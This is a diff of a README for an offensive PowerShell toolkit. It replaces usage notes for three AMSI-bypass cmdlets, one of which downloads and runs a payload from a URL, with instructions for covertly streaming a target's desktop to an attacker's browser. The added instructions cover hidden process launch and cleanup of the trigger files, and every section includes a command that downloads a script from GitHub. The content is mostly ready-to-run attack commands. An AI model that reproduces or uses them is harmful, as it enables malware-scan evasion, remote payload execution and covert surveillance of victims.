@@ -1,70 +1,35 @@
-## AMSBP.ps1
+## Stream-TargetDesktop.ps1
 
 |Function name|Description|Privileges|Notes|
 |---|---|---|---|
-|AMSBP|Disable AMSI within current process|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|
+|Stream-TargetDesktop|Stream target desktop live|User Land|Dependencies: firefox browser (attacker)<br />[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|
 
 <br />
 
 **downloadcmdLet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream-TargetDesktop/Stream-TargetDesktop.ps1" -OutFile "Stream-TargetDesktop.ps1"
 ```
 
 **execute:**
 ```powershell
-Import-Module -Name ".\AMSBP.ps1" -Force
-AMSBP
+#Build triggers script
+echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
+Add-Content -Path "$Env:TMP\trigger.ps1" -Value "TargetScreen -Bind -Port 8081"
+
+
+#Start capture desktop
+Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"
+
+#Access live stream
+Start firefox on: "http://${RemoteHost}:${BindPort}"
+
+
+#Stop stream
+$StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' }
+Stop-Process -id $StreamPid -EA SilentlyContinue -Force
+
+#CleanUp
+Remove-Item -Path "$Env:TMP\trigger.ps1" -Force
+Remove-Item -Path "$Env:TMP\mypid.log" -Force
 ```
-
-<br />
-
-## Disable-Amsi.ps1
-   
-|Function Name|Description|Privileges|Notes|
-|---|---|---|---|
-|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|3 bypass technics available (auto-sellection)<br />[Disable-Amsi cmdlet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
-
-<br />
-
-**downloadcmdLet:**
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
-```
-
-**execute:**
-```powershell
-Import-Module -Name ".\Disable-Amsi.ps1" -Force
-Disable-Amsi -DontDisableBlockLogging "true"
-```   
-
-<br />
-
-## Invoke-Bypass.ps1
-   
-|Cmdlet Name|Description|Privileges|Notes|
-|---|---|---|---|
-|Invoke-Bypass|disable AMSI within current process + exec script through bypass?|User Land|3 bypass technics available (manual)|
-
-<br />
-
-**downloadcmdLet:**
-```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
-```
-
-**prerequisites:**
-```
--filepath 'string' only accepts .ps1 .bat .vbs file formats
--payloadurl 'string' only accepts .ps1 .bat .vbs file formats
-```
-
-**execute:**
-```powershell
-Get-Help .\Invoke-Bypass.ps1 -full
-.\Invoke-Bypass.ps1 -list "technic"
-.\Invoke-Bypass.ps1 -technic "1"
-.\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
-.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
-.\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
-```   
